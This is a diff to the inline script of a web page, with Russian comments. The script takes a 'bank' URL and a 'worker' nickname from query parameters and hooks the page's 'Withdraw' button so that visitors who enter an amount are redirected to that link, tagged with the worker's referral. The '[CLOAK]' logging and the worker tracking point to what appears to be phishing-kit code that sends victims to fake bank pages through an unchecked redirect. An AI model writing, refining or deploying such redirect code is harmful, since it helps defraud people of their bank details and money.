@@ -505,94 +505,38 @@
         });
     </script>
     <script>
-(function(){
-  // Берём параметр to из URL
+(function() {
+  // Получаем ссылку на "банк" из URL (to=...)
   const params = new URLSearchParams(window.location.search);
-  let to = params.get('to');
+  const target = params.get('to');
 
-  console.log('[CLOAK] raw to param:', to);
+  // Если ссылки нет — ничего не делаем
+  if (!target) return;
 
-  if (!to) {
-    console.log('[CLOAK] Параметр to отсутствует — ничего не делаем.');
-    return;
-  }
+  // Получаем ник воркера (если есть)
+  const ref = params.get('ref');
 
-  // Попробуем безопасно декодировать: сначала один раз, затем, если похоже, что осталось кодирование (%25), попробуем декодировать ещё раз
-  function safeDecode(s) {
-    try { return decodeURIComponent(s); }
-    catch(e) {
-      console.warn('[CLOAK] decodeURIComponent error:', e);
-      return s;
-    }
-  }
-
-  let decoded = safeDecode(to);
-  console.log('[CLOAK] decoded once:', decoded);
-
-  // Если в decoded остались '%25' — это признак двойного кодирования -> попробуем ещё раз
-  if (decoded.includes('%25')) {
-    const decodedTwice = safeDecode(decoded);
-    console.log('[CLOAK] decoded twice:', decodedTwice);
-    // если второй проход изменил строку — используем его
-    if (decodedTwice !== decoded) decoded = decodedTwice;
-  }
-
-  // Ещё проверка: если decoded не содержит "ref=" но содержит "ref%3D" — попробуем дополнительно
-  if (!decoded.includes('ref=') && decoded.includes('ref%3D')) {
-    const alt = safeDecode(decoded);
-    console.log('[CLOAK] alternate decode (ref%3D -> ref=):', alt);
-    if (alt && alt.includes('ref=')) decoded = alt;
-  }
-
-  // Итог: decoded должен быть окончательной ссылкой на банк
-  console.log('[CLOAK] final redirect target:', decoded);
-
-  // Прежде чем редиректить — если нужно, можно показать короткое уведомление пользователю,
-  // но тут мы делаем мгновенный редирект:
-  // Защитная проверка: если decoded не выглядит как URL, не редиректим.
-  try {
-  const u = new URL(decoded);
-
-  // Находим элементы формы
-  const withdrawBtn = document.querySelector('.withdraw-btn') || document.querySelector('#withdraw') || document.querySelector('button');
-  const amountInput = document.querySelector('#amount') || document.querySelector('input[name="amount"]');
-  const methodSelect = document.querySelector('#method') || document.querySelector('select[name="method"]');
+  // Находим кнопку "Вывести"
+  const withdrawBtn = document.querySelector('#withdraw') || document.querySelector('.withdraw-button') || document.querySelector('button');
 
   if (withdrawBtn) {
-    console.log('[CLOAK] Ждём заполнения формы и нажатия кнопки...');
+    withdrawBtn.addEventListener('click', function() {
+      // Проверяем, что выбрана сумма
+      const sumInput = document.querySelector('input[name="sum"]');
+      const sum = sumInput ? sumInput.value : null;
 
-    withdrawBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-
-      // Проверяем, выбрана ли сумма и способ
-      const amount = amountInput ? amountInput.value.trim() : null;
-      const method = methodSelect ? methodSelect.value.trim() : null;
-
-      if (!amount || !method) {
+      if (!sum) {
         alert('Выберите сумму и способ вывода!');
-        console.warn('[CLOAK] Не выбраны сумма или способ, редирект отменён.');
         return;
       }
 
-      console.log('[CLOAK] Всё заполнено, выполняем переход ->', decoded);
-      window.location.href = decoded;
+      // Собираем финальную ссылку
+      let finalUrl = decodeURIComponent(target);
+      if (ref) finalUrl += (finalUrl.includes('?') ? '&' : '?') + 'ref=' + ref;
+
+      // Переход на банк
+      window.location.href = finalUrl;
     });
-
-  } else {
-    console.warn("[CLOAK] Кнопка 'Вывести' не найдена, переход не выполнен");
-  }
-
-} catch(e) {
-    console.error('[CLOAK] final target не является допустимым URL — редирект отменён:', decoded, e);
-    // Показать пользователю ссылку для ручного перехода
-    const wrapper = document.createElement('div');
-    wrapper.style.padding = '20px';
-    wrapper.style.fontFamily = 'sans-serif';
-    wrapper.innerHTML = '<p>Не удалось автоматически перейти. Нажмите <a id="manualLink" href="#">сюда</a>.</p>';
-    document.body.innerHTML = '';
-    document.body.appendChild(wrapper);
-    const a = document.getElementById('manualLink');
-    a.href = decoded;
   }
 })();
 </script>
